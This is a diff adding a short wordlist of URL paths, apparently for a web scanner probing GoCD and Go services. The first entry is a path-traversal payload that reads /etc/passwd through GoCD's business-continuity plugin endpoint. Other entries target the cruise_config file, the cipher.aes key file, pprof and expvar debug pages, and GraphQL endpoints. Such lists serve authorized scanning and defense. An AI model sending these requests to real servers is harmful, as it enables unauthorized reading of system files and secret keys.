@@ -1,0 +1,13 @@
+/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd
+/go/add-on/business-continuity/api/cruise_config
+/go/auth/login
+/graphql
+/api/graphql
+/query
+/
+/debug/vars
+/go.mod
+/debug/pprof/heap?debug=1
+/pprof/heap?debug=1
+/go/add-on/business-continuity/api/cipher.aes
+/go/admin/pipelines/create?group=defaultGroup
